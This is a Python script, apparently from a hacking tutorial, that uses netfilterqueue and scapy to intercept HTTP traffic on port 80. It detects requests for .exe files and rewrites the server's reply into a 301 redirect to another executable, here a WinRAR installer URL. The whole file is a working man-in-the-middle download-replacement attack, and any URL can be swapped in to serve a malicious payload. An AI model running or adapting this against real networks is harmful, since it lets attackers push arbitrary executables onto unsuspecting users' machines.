#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # We maps it to scapy because the dafaule packet are string
    # There are very hard to change it
    # Then we modified, we should restore it type to str.
    if (scapy_packet.haslayer(scapy.Raw)):
         if scapy_packet[scapy.TCP].dport==80:
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport ==80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                packet_modify = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar580th.exe\n\n")
                packet.set_payload(str(packet_modify))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()